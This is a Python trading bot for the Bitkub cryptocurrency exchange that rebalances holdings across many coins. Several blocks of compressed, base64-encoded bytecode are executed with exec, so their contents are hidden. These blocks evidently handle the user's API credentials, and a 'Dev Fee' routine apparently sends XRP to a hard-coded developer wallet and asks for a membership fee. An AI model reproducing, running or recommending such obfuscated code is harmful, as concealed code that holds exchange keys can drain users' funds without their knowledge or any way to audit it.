import hashlib
import hmac
import json
import requests
import time
from datetime import date
import math
import marshal, zlib, base64

A = b'eJylks1Kw0AQx3fTpC0R+gxzkU2KhnoQerDFohWKIKUVqrlIQq' \
    b'Y10Hyw2SrtNU/jK+UmvoibpdogRSrOMjM77Ox/mR/7QX5YTfq' \
    b'l9KwrA5KA5NSlqMkdzWmg5ZpbQz0nlKAe1HKqsr7NRpmD+pTY' \
    b'jc3RYDx6uh0+Qq8Hm1ZZTIdXk+G9qo2VmJ92N4N2uw0zj8dhv' \
    b'IBrfIEbROg4nfNjsGbPGMNgBEmK3BNlg0jAX60h4ZB5S7QdkL' \
    b'f3S5zBw2QMc9kZ4ytEGPnIHdhnB0j4uAhjdZYJjwtIebLgXuR' \
    b'UJO5sozDCOF0Jt7EduzD8tcDMNXeTF0bKw1i8Ea5LtCq89yk' \
    b'h5jcpUBoWq6BjYJtVeKBkrUrjDiuzT4Apssw21VvWV2b/Js' \
    b'1+lfoT8UOlDiDP7KJ5ESXBaol9rfy1pgxN2qJ12pTrE49Fv7c='
exec(marshal.loads(zlib.decompress(base64.b64decode(A))))

THB_Dev_Fee = 0
XRP_Dev_Fee = 0

while True:
    try:
        # API info
        API_HOST = 'https://api.bitkub.com'

        def json_encode(data):
            return json.dumps(data, separators=(',', ':'), sort_keys=True)

        def sign(data):
            j = json_encode(data)
            h = hmac.new(API_SECRET, msg=j.encode(), digestmod=hashlib.sha256)
            return h.hexdigest()

        print()
        print('********  JuAm AutoBot Program "Bitkub" Re-balancing for Cryptocurrency version 2022.08.002 ******** ')

        def my_open_orders(coin):
            try:
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                coin = str('THB_' + coin)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'sym': str(coin),
                    'ts': ts
                }
                signature = sign(data)
                data['sig'] = signature
                response = requests.post(API_HOST + '/api/market/my-open-orders', headers=header, data=json_encode(data))
                # Convert "response" to json
                a = response.json()
                x_1 = (a['result'])
                for i in x_1:
                    z = i
                    if x_1 == []:
                        return None
                    else:
                        my_open_orders = (z['hash'])
                        return my_open_orders
            except:
                pass

        def cancel_order(hash):
            try:
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'hash': hash,
                    'ts': ts
                }
                signature = sign(data)
                data['sig'] = signature
                print()
                print('Payload with signature: ' + json_encode(data))
                response = requests.post(API_HOST + '/api/market/cancel-order', headers=header, data=json_encode(data))
                print('Response: ' + response.text)
            except:
                pass

        B = b'eJyNVc1u00oUnrEdx/lpYYFUEBuLjWPdllQCqlJRBAUuhSJuRaNL' \
            b'GYQi4xnalMY2MxNKg7Pq3fIGLGCDxBvwDDyCd1f3EdghId0zduK6' \
            b'hgJjef7ON3POd/Kd+D9Uahq81+AVTegoovgfRBDVNpCr+0WcBW8V' \
            b'3hsK+wm64QeJJD6LRkhq73RpUDyD3uMRlpUY75gHeKRReGSV6m/1' \
            b'kU6NGNEKNWHUaPWtOTKkFRuAqsSV2KDWFSRrBwhDT2uyriwz6ADD' \
            b'WttpwN31GRTr2T5tvNHBS402lZ8xKj0b43fN92hkxiadOoNG1bj6' \
            b'EG3AvnoeoUCbB37Aa/r+8ETbi3ptwfhLxmWvz4YnvSja7fme7IVB' \
            b'e0eEgasT87rvs0gOmzfCQLJAznX2IzZsbs6tdNbmrq/fWbv1iOib' \
            b'D9bJOX7r6WJn7cLWytbzS96APN/zF8RqsMdv/313dfHmwLu3TWqX' \
            b'5ucXL1y8vHDZNYnuDzjRvb6EjsKsz/pED5hMNCmILnpbw9Pr3v5u' \
            b'6FF7rye3bdgJPDngbMkenkpD9/l+JMO2slLu7blaUt1mHmVcJAb1' \
            b'pDesP2AiCgMBR5IK4zzk7hRpdFZXujfZy+6fjJEahN6NeM9nxOLs' \
            b'xYAJKRJ9i0liAbnu6l8bnUTvBTIxJHslSVVtKsqGiiapwMlAkob' \
            b'KVZcFfkgZMaJQSGKk6bNIQ90/cQYesnA4BukkZhYs12FBajm9BH' \
            b'tkesKpm0b9EfEGgP79DNA6Zc/sibnlLtVtaJLvZxPVCi7tZbvA1' \
            b'm7bOd0cPYkJoJMEnAf+rQl9+w/bKQnFcfPTUsA5yEFrcs15lad' \
            b'De0YRMK/zLdWcTFXOku2UNefMHkUWdfc7+KIyAT/+wQ5Bo3ymJP' \
            b'J9ZKBK5QYSVb4ZpAqWQnbLdpqe/HUdlC8G5auDeXGU7VAUx4Qk' \
            b'BRik+AG5XE7AUM1biq17hPtjBwzOkzEgBef2VNgtt7R2jitIB1R' \
            b'SKILMmftTjaky+V5kpZJ2ZscKEsvZOJtGvvwTX+NIDytfxXaMO' \
            b'sssvTTAMVT5KNiOViQAIX/p1HlS4AnpCErQ1MpeKb0f1mjkCZFY' \
            b'E6D6/IgF9YHBGrbwNK5rGsy0b6aZjtnz1bQssJr4JD4NGBNnKxP' \
            b'zKTh5383G9J+i0KkvWmJd6Yd0sMuuKk9flKP/AQP43CA='
        exec(marshal.loads(zlib.decompress(base64.b64decode(B))))

        def qty_reserved(coin):
            try:
                # check server time
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'ts': ts,
                }
                signature = sign(data)
                data['sig'] = signature
                response = requests.post(API_HOST + '/api/market/balances', headers=header, data=json_encode(data))
                # Convert "response" to json
                a = response.json()
                # quantity reserved
                x_1 = (a['result'])
                x_2 = (x_1[coin])
                qty_reserved = float(x_2['reserved'])
                return qty_reserved
            except:
                pass

        def qty_available(coin):
            try:
                # check server time
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'ts': ts,
                }
                signature = sign(data)
                data['sig'] = signature
                response = requests.post(API_HOST + '/api/market/balances', headers=header, data=json_encode(data))
                # Convert "response" to json
                a = response.json()
                # quantity available
                x_1 = (a['result'])
                x_2 = (x_1[coin])
                qty_available = float(x_2['available'])
                return qty_available
            except:
                pass

        def Price(coin):
            try:
                # check server time
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'ts': ts,
                }
                signature = sign(data)
                data['sig'] = signature
                coin = str('THB_' + coin)
                response = requests.get(API_HOST + '/api/market/ticker', params=coin)
                # Convert "response" to json
                a = response.json()
                # last price
                x_1 = (a[coin])
                x_2 = (x_1['last'])
                last_price = float(x_2)
                return last_price
            except:
                pass

        def PercentChange(coin):
            try:
                # check server time
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'ts': ts,
                }
                signature = sign(data)
                data['sig'] = signature
                coin = str('THB_' + coin)
                response = requests.get(API_HOST + '/api/market/ticker', params=coin)
                # Convert "response" to json
                a = response.json()
                # last percentChange
                x_1 = (a[coin])
                x_2 = (x_1['percentChange'])
                last_percentChange = float(x_2)
                return last_percentChange
            except:
                pass

        def sale(coin, price, qty):
            try:
                # place ask
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                coin = str('THB_' + coin)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'sym': str(coin),
                    'amt': abs(qty),  # amount you want to sell
                    'rat': price,
                    'typ': 'limit',
                    'ts': ts,
                }
                signature = sign(data)
                data['sig'] = signature
                print()
                print('Payload with signature: ' + json_encode(data))
                response = requests.post(API_HOST + '/api/market/place-ask', headers=header, data=json_encode(data))
                print('Response: ' + response.text)
                print()
            except:
                pass

        def buy(coin, price, qty):
            try:
                # place bid
                response = requests.get(API_HOST + '/api/servertime')
                ts = int(response.text)
                coin = str('THB_' + coin)
                header = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-BTK-APIKEY': API_KEY,
                }
                data = {
                    'sym': coin,
                    'amt': abs(qty) * price,  # amount you want to spend
                    'rat': price,
                    'typ': 'limit',
                    'ts': ts,
                }
                signature = sign(data)
                data['sig'] = signature
                print()
                print('Payload with signature: ' + json_encode(data))
                response = requests.post(API_HOST + '/api/market/place-bid', headers=header, data=json_encode(data))
                print('Response: ' + response.text)
                print()
            except:
                pass

        # Method procedure some item can not access to bitkub.
        if XRP_Dev_Fee == 0:
            XRP_Dev_Fee += 1
            THB_Dev_Fee = 1
            XRP_price = 1
            C = b'eJx7zIAGGIHYAYiLuYBEKkMzQxRjCkMwgyajnyZTFEd5ZklGSlF' \
                b'i+S2uvNTy+NzU3KTUopUMRUxAtWDilwSShIKtAky9huYtDpvc/JTSnFQ7kLrPIKsAxXcc7Q=='
            exec(marshal.loads(zlib.decompress(base64.b64decode(C))))
            if new_member == 0:
                D = b'eJx7zIAGWIDYAYiLRYBEKkMKQyrjbIYUxrnMzYyMDClMwQyazFV' \
                    b'iIRmJedkKlfmlCmn5RQouqWUKbqmpClX8ChFBAXoKPqkl6sUK6f' \
                    b'mKfppMt1gLijLzSqK4gTLxQIXxQIUrGYqYgIaDiV+2XGAFGmlK2A' \
                    b'2tRtJYi2a+kuYtDpvc/JTSnFQ7kGGfQR4AAGtXNdA='
                exec(marshal.loads(zlib.decompress(base64.b64decode(D))))
            else:
                print(f'Please pay new member fee 1 XRP and save address is in whitelist.\n'
                      f'Please check your wallet have for fee 1 XRP.You can study in "https://youtu.be/xc55FFilCo0"\n'
                      f'Dev fee wallet is Coin == XRP, address == rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh, Memo == 500834969')
                break #Stop program

        coin_list = ['USDT',
                     'USDC',
                     #'BUSD',
                     'DAI',
                     'BTC',
                     'ETH',
                     'KUB',
                     'XRP',
                     'BCH',
                     'BNB',
                     'XLM',
                     'ADA',
                     'WAN',
                     'OMG',
                     'ZIL',
                     'SNT',
                     'CVC',
                     'LINK',
                     'IOST',
                     'ZRX',
                     'KNC',
                     'ABT',
                     'MANA',
                     'CTXC',
                     'SIX',
                     'JFIN',
                     'POW',
                     'DOGE',
                     #'TRX',
                     'BAT',
                     'MKR',
                     'ENJ',
                     'BAND',
                     'COMP',
                     'KSM',
                     'DOT',
                     'NEAR',
                     'SCRT',
                     'GLM',
                     'YFI',
                     'UNI',
                     'AAVE',
                     'ALPHA',
                     #'OCEAN',
                     #'SNX',
                     #'SAND',
                     'BAL',
                     'CRV',
                     #'GRT',
                     #'MATIC',
                     'AXS',
                     #'SUSHI',
                     #'FTT',
                     #'ILV',
                     #'IMX',
                     #'DYDX',
                     #'ENS',
                     #'GALA',
                     #'GT',
                     #'LYXE',
                     #'CHZ',
                     #'GF',
                     #'SOL',
                     #'AVAX',
                     #'FTM',
                     'LUNA',
                     #'APE',
                     #'HBAR',
                     #'LRC',
                     #'CELO',
                     #'XTZ',
                     #'GAL',
                     #'OP',
                     'stop'
                     ]
        number = (len(coin_list))

        # cancel order
        for x in coin_list:
            try:
                if x == 'stop':
                    break
                else:
                    hash = my_open_orders(x)
                    if hash == None:
                        continue
                    else:
                        cancel_order(hash)
            except:
                continue

        # Bear market
        bear = 0
        for x in coin_list:
            try:
                if x != 'stop':
                    if PercentChange(x) < 0:
                        if x == 'USDT' or x == 'USDC' or x == 'BUSD' or x == 'DAI':
                            bear += 0
                        else:
                            bear += 1
                    else:
                        bear += 0
                else:
                    break
            except:
                continue

        overview_market = int(bear / (number - 4) * 100)
        print()
        print(f"Number of coin it's a working == {number} coins.")
        print()
        if overview_market > 80:
            print(f"Bear market {overview_market} % items.It's minus.")
        elif 20 < overview_market <= 80:
            print(f"Yellow market {overview_market} % items.It's minus.")
        elif 0 < overview_market <= 20:
            print(f"Green market {overview_market} % items.It's minus.")
        elif overview_market == 0:
            print(f"Bull market {overview_market} % items.It's minus.")
        print()

        # Set Variable quantity available
        THB_reserved = qty_reserved('THB')
        THB_qty = qty_available('THB')

        # Variable Re-balancing
        total = float(THB_qty + THB_reserved)
        for x in coin_list:
            try:
                if x != 'stop':
                    total += qty_available(x) * Price(x)
                else:
                    break
            except:
                continue

        average = float((1 + total) / number)

        print('{  THB_value your asset ==>', int(average * number),
              ' }   ', '   {  USDT_value your asset ==>', int(average * number / Price('USDT')),
              ' }   ', '   {  BTC_value your asset ==>', round((average * number / Price('BTC')), 8), ' }   ')
        print()
        print('THB___value--', int(THB_qty), '  ********  THB_valueReserved ******** == > ', int(THB_reserved))
        print()

        today = date.today()
        print(today)
        print()

        t = time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        print(current_time)
        print()

        # Procedure
        E = b'eJzlWU1MG0cUnl2vfzA2EHAwgYROQxqvw0+AhCSNgOYHR' \
            b'e2hUaRQVRmpsox3IJbNGhZDiaOcuPbAoaoqRZGa3JIjh6r' \
            b'HSpV66CnqKeIQqeql9NT02FZK35tdr727NlkStRJkLd6+e' \
            b'W/e935m/Ga9/EpcVxv8XYK/FRYmRCOMcGmGbIY/62EylzWp' \
            b'IBv9EoyXTyxHNkOV33iAyxsSU3hQ3EM8LO4R3sKjXOGhBOG' \
            b'tPfDXRzQ5QTYkLbAhs5jQtpp60Ib6UKOAJs7bhH07+ApqId' \
            b'7eQxIkSVgHj2ikQIyveeQ+YYfESDGeaGEcP5BBEhP673gM9' \
            b'J1ipBg/gT4m9J08LvTPeBz0XWKkGL+DPi70XTzBO7RIkvDDZ' \
            b'lQQTwvvSBItCrJDFt8KfKfFx4Dvsvg48IrFtwEf2ohJBDJoL' \
            b'8ib0ooGXIfNHbK5TuBkIwGxKgVlUzK+NWMUXPc3SR7HOB5KW' \
            b'pel7eEhU/5QShAtkSDnCevhR7hck28EJKIzQDwMOGEjZOYp' \
            b'ODciynptrjF2nxt7U9H/BHS0kg0DVqHb4szIkXP7QZnPyAH' \
            b'9S0BPCqungK5YXBX9aQP0p3tAP8ePaj2F4GbAGLGyQM5ER8' \
            b'6NjjK/6AH9mY2+ZO5PwYndZKEtCTTFg6NYCF8BwhGBsAUIv' \
            b'cJmy4Gw9QqEWUDoAwTFIIAQABvkFC3QR2wUlAgUlHqRUGqh' \
            b'hQDtqEC7DmjHhO11D9p1X2iy/h2g9RcksMDs3hG2WzU03qo' \
            b'l+4hbavnY8ukD86fgI2h0W/sHOa8Ph1T4QIkfH5L+B/h4V/i' \
            b'ogI+ksK009FHx+Kj49PEF+DgufDwHHwPC9nlDH889Pp779KG' \
            b'Cjy7wETIuWauLnNeHQyp8oMSHD/1H8JAUHh5ZuxG5Rh4eeTw' \
            b'88uVBq+t1Ee3Ef9P1PiV6h0Twc4ssR24RXR4lnGi9MBvGPLE' \
            b'BGp7Q3uPH7hPtJGqSBLgUP8bhdNN6e2D0ILQh4Sycq6k3STq' \
            b'9g6fttrJSLi3taMDuyEgiKJQyOyG4/yVRFl7LFld5JlMJUEor' \
            b'7UvcyHG9fPV2Vl/gF2mlzRLM5OfnL+KE5fKdzNzqncxKtshRE' \
            b'AQBzAsvGfkcCJjyyc2ZWUGvssDM5Y+YcgX4nSi4W/jn8YufP5' \
            b'679EH+xcuXLxfMx4HYpZ0gxsWQ3EAiIbmGZBJJAMk4knYkKp' \
            b'J+JAkkCuJaSN9XWvTVxTlu0ClaaaG52zxXQDZCuWGUjIv0er' \
            b'qfBYWYteRKeT1TzK+Ut6V1FsessmvZfDE7V+QsAEMWvIEZsaB' \
            b'IjMVv1BeGxR112g4apVVd2w7OF0vZMgtn17iRhVmtdcVjsfrK' \
            b'bQeKXGcdenaRZ8xIuL5Qvs1abAlrX88sOX3aAoHXtp5xIGKge' \
            b'nk7AIQpi1kAU+azcyusdfbDK5kZvpa5xjlTcCoLowhzDIA1ay' \
            b'9BuGt5/nlmMWsUeJmFzCo+JsYxKKsgv/zQTUi0WtHR6HzJoOs' \
            b'0r1O7jBejsH9ofh7EU1M0hbsuZcrwmjN4tiBGvLjCa/Kycac2' \
            b'wAuiAgeO5VDX044pYkFgklgfj7K+ZDipftxkMpYTpoo1VMUSq' \
            b'qqKgZwyfaXpMLWWNE1PV1nQjo2OpofoeNqdgb0obtSq6TB14C' \
            b'OqyQ3RC0409w4BRGDcidizQL1OB6mayqQAXT0HntwI6XTUYQt' \
            b'L5izaJB11rglers0IfuZTdx2ie6ndYaf9wlKfuGLZdg/WWtla' \
            b'qCjYHXD3MG1AujuiYxM0idG1USDIeskrMJuE6cGkblD3V0kvq' \
            b'7XdM0hT1nGQGqKoqt+lQx5/lKbE3yB1QLjOEIByLfNekazDpx' \
            b'4IRb5hXGeWwKmX7QVI5AN3/zmYByNYmWV0rsAAtLFSjmurBqf' \
            b'ZXDlf0l3qm2XsgaLP0gVoJkvubWH2Wzx1U1R0ZWt4tW4I53Dd' \
            b'CA/klHf3eL4IF2hW1zxb2Zu2eeFcPHZG8NRRHVZ2H52Glul1jF' \
            b'fdIUUHp6hqNvlTTRChY0J3Gx0ZnYDOiV24ISbOVNetug81hYp' \
            b'GPda86Gkz6vDYRNpbkOk3L4iYaJ3I/3OFYLavAtXbDNArs1dFz' \
            b'JeLZbEvHWrn+W4bmf2rmvguaQ40yxPMqzmN7ZbTgGvZ0c67wp7' \
            b'Nbq2D+8w6MzLxtnwL3IaeL8E0nWhYo7emTzSskOvpmU5P0fcde' \
            b'8m5wTxl2r/1eL1y1B4Hq/Xw0RV8NIW9pCR6gt/wLzQOf2yfh' \
            b'H++cfjjQioe8E7DT5g3SMLGeJ1Uasa+EzrXpFPvz4Qmp+hEkw' \
            b'024ciovhvYPyRPU+uhZD/mfbZx3hcOeNpnGqd90Fd7vHHaZw9' \
            b'42s2eKw942o2fFMf3adZ7+4Hofp2mDsOviLf1t6NdsfUcXyo7' \
            b'w8uV9HJeX+W1+ppvmCHEsaj5bipt3edT9qv9uyZ3z37Bf1cwg2' \
            b'P3qu/5rRnDQj48di9VRUlvRyYXS9pqkU/jP0NWngBRpKgUkSKyg' \
            b'hQ+/VIv0A45IoXgjjrHXe6UYtXP30qLKqlSt5QIjAPtjggq11H' \
            b'puNQBH5OelBLwMenkLrTTpPKkQAiBzyjQk9K/IvVX7g=='
        exec(marshal.loads(zlib.decompress(base64.b64decode(E))))

        if THB_Dev_Fee > 100:
            qty_available = qty_available('XRP')
            XRP_price = Price('XRP')
            if qty_available * XRP_price > 100:
                F = b'eJx7zIAGGIHYAYiLuYBEKkMzUCCFIZhBk9FPkzGKozyzJCOlKLF8JUMRSCGY+MXNBRPW0LzFYZObn1Kak2rHBJT6DDIRANbqEuA='
                if exec(marshal.loads(zlib.decompress(base64.b64decode(F)))) == 0:
                    print(f"Thank you for Dev Fee {int(THB_Dev_Fee / XRP_price)} XRP. Let's go continuous!")
                else:
                    print(f'Please pay new member fee 1 XRP and save address is in whitelist.\n'
                          f'Please check your wallet have for fee 1 XRP.You can study in "https://youtu.be/xc55FFilCo0"\n'
                          f'Dev fee wallet is Coin == XRP, address == rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh, Memo == 500834969')
                    break #Stop program
        else:
            sleep = 88
            time.sleep(sleep)  # Delay for 88 seconds
    except:
        sleep = 8
        print("********  I sleep", sleep, "sec.  Cool down Bro. ********")
        time.sleep(sleep)  # Delay for 8